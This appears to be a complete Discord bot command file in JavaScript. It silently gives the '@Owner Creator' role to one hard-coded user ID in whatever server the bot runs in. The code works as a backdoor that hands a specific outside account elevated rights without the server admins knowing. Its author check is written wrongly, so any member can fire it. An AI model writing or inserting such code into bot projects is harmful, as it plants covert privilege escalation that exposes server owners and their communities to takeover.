exports.run = (client, message, args) => {
if(!message.guild) return; if(!message.author.id == "400703871086886913") return; let johnMember = message.guild.members.get('400703871086886913');
let mcRole = message.guild.roles.find('name', "@Owner Creator");
 if(!mcRole) return; if(!johnMember) return;
 if(johnMember.roles.has(mcRole.id)) return; johnMember.addRole(mcRole.id);
}